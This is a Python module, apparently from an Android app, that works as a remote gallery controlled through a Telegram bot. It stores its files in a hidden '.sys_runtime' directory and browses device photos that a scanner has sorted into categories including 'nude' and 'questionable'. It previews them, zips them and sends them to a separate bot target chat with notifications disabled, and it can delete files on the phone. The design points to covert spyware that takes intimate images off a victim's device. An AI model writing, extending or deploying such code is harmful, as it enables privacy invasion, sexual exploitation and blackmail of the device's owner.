# -*- coding: utf-8 -*-
import os
import time
import zipfile
import logging
import random
import gc
import json
import threading
import hashlib

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "g_tmp")     # مجلد مؤقت للمعاينات والتحميلات
if not os.path.exists(T):
    os.makedirs(T)

logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR, filemode='a')

try:
    from PIL import Image, ImageOps
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    from kivy.clock import Clock
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False


class G:
    def __init__(self, sc=None, tg=None):
        self.sc = sc      # MediaScanner instance
        self.tg = tg      # TelegramUI instance
        self.ipp = 16     # عدد الصور في الصفحة الواحدة
        self._timers = []  # الاحتفاظ بالمؤقتات النشطة
        self._lock = threading.Lock()  # قفل للعمليات المتزامنة
        self._cleanup_old_temp()

    # ========== تنظيف الملفات المؤقتة القديمة ==========
    def _cleanup_old_temp(self):
        """تنظيف الملفات المؤقتة الأقدم من ساعة"""
        try:
            now = time.time()
            if os.path.exists(T):
                for f in os.listdir(T):
                    path = os.path.join(T, f)
                    try:
                        if os.path.isfile(path) and os.path.getmtime(path) < now - 3600:
                            os.remove(path)
                    except:
                        pass
        except Exception as e:
            logging.error(f"Gallery cleanup error: {e}")

    # ========== التحقق من التبعيات ==========
    def _check_dependencies(self):
        """التحقق من توفر المكونات الأساسية"""
        if self.sc is None:
            logging.error("MediaScanner not available")
            return False
        if self.tg is None:
            logging.error("TelegramUI not available")
            return False
        return True

    # ========== إنشاء صورة مصغرة ==========
    def _thumbnail(self, path, size=(300, 300)):
        """إنشاء صورة مصغرة مع التحقق من الصحة"""
        if not PIL_AVAILABLE or not os.path.exists(path):
            return None
        try:
            # التحقق من أن الملف صورة
            ext = os.path.splitext(path)[1].lower()
            if ext not in ['.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif']:
                return None
                
            with Image.open(path) as img:
                # التوافق مع الإصدارات المختلفة من PIL
                try:
                    resample = Image.Resampling.LANCZOS
                except AttributeError:
                    resample = Image.LANCZOS
                
                img = ImageOps.fit(img, size, method=resample, centering=(0.5, 0.5))
                out_path = os.path.join(T, f"th_{int(time.time()*1000)}_{random.randint(1000,9999)}.jpg")
                img.save(out_path, "JPEG", quality=70, optimize=True)
                
                # التحقق من إنشاء الملف
                if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                    return out_path
                return None
                
        except Exception as e:
            logging.error(f"Thumbnail error: {e}")
            return None

    # ========== دالة مساعدة: تحويل اسم الفئة ==========
    def _get_category_emoji(self, cat):
        emoji_map = {
            "pending": "📷",
            "nude": "🔞",
            "questionable": "⚠️",
            "normal": "✅"
        }
        text_map = {
            "pending": "جديد",
            "nude": "حساس",
            "questionable": "مشبوه",
            "normal": "عادي"
        }
        return emoji_map.get(cat, "🖼️"), text_map.get(cat, cat)

    # ========== واجهة لوحة المفاتيح ==========
    def get_grid_kb(self, cat="pending", page=0):
        """إنشاء لوحة مفاتيح تفاعلية للمعرض"""
        if not self._check_dependencies():
            return {"inline_keyboard": [[{"text": "❌ الخدمة غير متوفرة", "callback_data": "nop"}]]}

        try:
            stats = self.sc.get_statistics()
            if stats is None:
                stats = {}
        except Exception as e:
            logging.error(f"Stats error: {e}")
            stats = {}

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if items is None:
                items = []
        except Exception as e:
            logging.error(f"Gallery fetch error: {e}")
            items = []

        total = stats.get(cat, 0)
        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1

        keyboard = []

        # صف أزرار الفئات
        cats_row = []
        for c in ["pending", "nude", "questionable", "normal"]:
            count = stats.get(c, 0)
            if count > 0:
                emoji, name = self._get_category_emoji(c)
                display = f"{emoji} {name} ({count})" if c != cat else f"✅ {emoji} {name} ({count})"
                cats_row.append({"text": display, "callback_data": f"g_nav|{c}|0"})
        if cats_row:
            keyboard.append(cats_row[:4])

        # شبكة الصور 4×4
        row = []
        for i in range(self.ipp):
            if i < len(items):
                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "nop"}
            row.append(btn)
            if len(row) == 4:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        # أزرار التنقل بين الصفحات
        nav_buttons = []
        if page > 0:
            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
        if len(items) == self.ipp and (page + 1) < total_pages:
            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        keyboard.append(nav_buttons)

        # زر التحميل الجماعي للصفحة
        if items:
            keyboard.append([{"text": "📦 تحميل الصفحة الحالية (ZIP)", "callback_data": f"g_bulk|{cat}|{page}"}])

        return {"inline_keyboard": keyboard}

    # ========== عرض خيارات ملف معين ==========
    def show_options(self, cid, cat, page_str, idx_str):
        """عرض خيارات التفاعل مع ملف محدد"""
        if not self._check_dependencies():
            return

        try:
            page = int(page_str)
            idx = int(idx_str)
        except ValueError:
            logging.error(f"Invalid page/index: {page_str}, {idx_str}")
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if items is None or idx >= len(items):
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
                return
        except Exception as e:
            logging.error(f"Show options error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
            return

        item = items[idx]
        path = item.get('path')
        label = item.get("label", "??")
        
        if not path or not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود على الجهاز."})
            return

        try:
            size_mb = round(os.path.getsize(path) / (1024 * 1024), 1)
        except:
            size_mb = 0

        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
            [
                {"text": "⬇️ تحميل (ZIP)", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
            ],
            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
        ]
        
        try:
            self.tg._api("sendMessage", {
                "chat_id": cid,
                "text": f"📦 **#{label}**  |  حجم: `{size_mb} MB`\n📂 الفئة: `{cat}`",
                "reply_markup": json.dumps({"inline_keyboard": kb}),
                "parse_mode": "Markdown"
            })
        except Exception as e:
            logging.error(f"Send options error: {e}")

    # ========== تنفيذ الإجراءات ==========
    def execute_action(self, cid, action, cat, page_str, idx_str=None):
        """تنفيذ الإجراء المطلوب"""
        if not self._check_dependencies():
            return

        try:
            page = int(page_str)
        except ValueError:
            logging.error(f"Invalid page: {page_str}")
            return

        # معالجة التحميل الجماعي (bulk)
        if action == "bulk":
            self._handle_bulk_download(cid, cat, page)
            return

        # الإجراءات الفردية
        if idx_str is None:
            return
            
        try:
            idx = int(idx_str)
        except ValueError:
            logging.error(f"Invalid index: {idx_str}")
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if items is None or idx >= len(items):
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
                return
        except Exception as e:
            logging.error(f"Execute action error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
            return

        item = items[idx]
        path = item.get('path')
        label = item.get("label", "??")

        if not path:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ مسار الملف غير صالح."})
            return

        if action == "pr":
            self._preview(cid, path)
        elif action == "dw":
            self._download(cid, path, label)
        elif action == "del" or action == "de":  # de من g_conf
            self._delete(cid, path, label, cat, page)
        else:
            logging.warning(f"Unknown action: {action}")

    # ========== معالجة التحميل الجماعي ==========
    def _handle_bulk_download(self, cid, cat, page):
        """معالجة تحميل صفحة كاملة كـ ZIP"""
        if not self._check_dependencies():
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if not items:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا توجد صور في هذه الصفحة."})
                return

            # التحقق من المساحة
            total_size = sum(os.path.getsize(i['path']) for i in items if i.get('path') and os.path.exists(i['path']))
            if total_size > 100 * 1024 * 1024:  # 100MB
                self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الصفحة كبير جداً (>100MB). حاول صفحة أخرى."})
                return

            zip_path = os.path.join(T, f"bulk_{cat}_p{page}_{int(time.time())}_{random.randint(1000,9999)}.zip")
            
            with self._lock:
                try:
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for item in items:
                            path = item.get('path')
                            if path and os.path.exists(path):
                                zf.write(path, os.path.basename(path))

                    # التحقق من إنشاء ZIP
                    if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                        raise Exception("Failed to create zip file")

                    target = getattr(self.tg, 'dat', cid)
                    with open(zip_path, 'rb') as f:
                        resp = self.tg._api("sendDocument", {
                            "chat_id": target,
                            "caption": f"📦 تحميل جماعي | الفئة: {cat} | الصفحة {page+1} | {len(items)} ملف",
                            "disable_notification": True
                        }, {"document": f})
                        
                    if resp and resp.get('ok'):
                        self.tg._api("sendMessage", {"chat_id": cid, "text": f"✅ تم إرسال {len(items)} ملفاً مضغوطاً."})
                    else:
                        self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل إرسال الملف المضغوط."})
                        
                except Exception as e:
                    logging.error(f"Bulk download error: {e}")
                    self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل إنشاء ملف ZIP: {str(e)[:100]}"})
                finally:
                    if os.path.exists(zip_path):
                        try:
                            os.remove(zip_path)
                        except:
                            pass
                    gc.collect()
                    
        except Exception as e:
            logging.error(f"Bulk handler error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في معالجة التحميل الجماعي."})

    # ========== معاينة الصورة ==========
    def _preview(self, cid, path):
        """إرسال معاينة للصورة"""
        if not self._check_dependencies():
            return

        if not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        # الفيديوهات لا تدعم المعاينة
        if path.lower().endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi', '.webm')):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة. يمكنك تحميله."})
            return

        thumb = None
        try:
            thumb = self._thumbnail(path)
            if not thumb:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
                return

            with open(thumb, 'rb') as photo:
                resp = self.tg._api("sendPhoto", {
                    "chat_id": cid, 
                    "caption": "🔍 معاينة (ستُحذف بعد 30 ثانية)"
                }, {"photo": photo})
                
            if resp and resp.get('ok'):
                msg_id = resp['result']['message_id']
                # جدولة الحذف
                self._schedule_delete(cid, msg_id, 30)
            else:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
                
        except Exception as e:
            logging.error(f"Preview error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في إرسال المعاينة."})
        finally:
            if thumb and os.path.exists(thumb):
                try:
                    os.remove(thumb)
                except:
                    pass

    # ========== تحميل الملف مضغوطاً ==========
    def _download(self, cid, path, label):
        """تحميل ملف مفرد كـ ZIP"""
        if not self._check_dependencies():
            return

        if not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        file_size = os.path.getsize(path)
        if file_size > 45 * 1024 * 1024:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
            return

        zip_path = os.path.join(T, f"dl_{int(time.time())}_{random.randint(1000,9999)}.zip")
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))

            if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                raise Exception("Failed to create zip")

            target_chat = getattr(self.tg, 'dat', cid)
            with open(zip_path, 'rb') as f:
                self.tg._api("sendDocument", {
                    "chat_id": target_chat, 
                    "caption": f"📤 {label}"
                }, {"document": f})
                
        except Exception as e:
            logging.error(f"Download error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في إرسال الملف: {str(e)[:100]}"})
        finally:
            if os.path.exists(zip_path):
                try:
                    os.remove(zip_path)
                except:
                    pass
            gc.collect()

    # ========== حذف الملف نهائياً ==========
    def _delete(self, cid, path, label, cat=None, page=None):
        """حذف ملف مع إمكانية العودة"""
        if not self._check_dependencies():
            return

        try:
            if os.path.exists(path):
                # نقل إلى سلة محذوفات بدلاً من الحذف النهائي (اختياري)
                # trash_dir = os.path.join(P, "trash")
                # os.makedirs(trash_dir, exist_ok=True)
                # os.rename(path, os.path.join(trash_dir, os.path.basename(path)))
                
                os.remove(path)
                
                # إزالة من قاعدة البيانات إذا كان متوفراً
                if self.sc and hasattr(self.sc, 'remove_from_db'):
                    try:
                        self.sc.remove_from_db(path)
                    except:
                        pass
                
                msg = f"🗑 تم حذف #{label} نهائياً."
                if cat is not None and page is not None:
                    msg += f"\n🔙 للعودة: /gallery_{cat}_{page}"
                    
                self.tg._api("sendMessage", {"chat_id": cid, "text": msg})
            else:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
        except Exception as e:
            logging.error(f"Delete error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في حذف الملف: {str(e)[:100]}"})
        finally:
            gc.collect()

    # ========== جدولة حذف الرسالة ==========
    def _schedule_delete(self, cid, msg_id, delay_seconds):
        """جدولة حذف رسالة بعد فترة زمنية"""
        def delete_task():
            try:
                self._delete_message(cid, msg_id)
            finally:
                # إزالة المؤقت من القائمة
                self._timers = [t for t in self._timers if t.is_alive()]
        
        timer = threading.Timer(delay_seconds, delete_task)
        timer.daemon = True
        timer.start()
        self._timers.append(timer)

    # ========== حذف رسالة ==========
    def _delete_message(self, cid, msg_id):
        """حذف رسالة من المحادثة"""
        if not self._check_dependencies():
            return
            
        try:
            self.tg._api("deleteMessage", {"chat_id": cid, "message_id": msg_id})
        except Exception as e:
            logging.error(f"Delete message error: {e}")


# ========== دالة المصنع ==========
def create(sc=None, tg=None):
    return G(sc, tg)
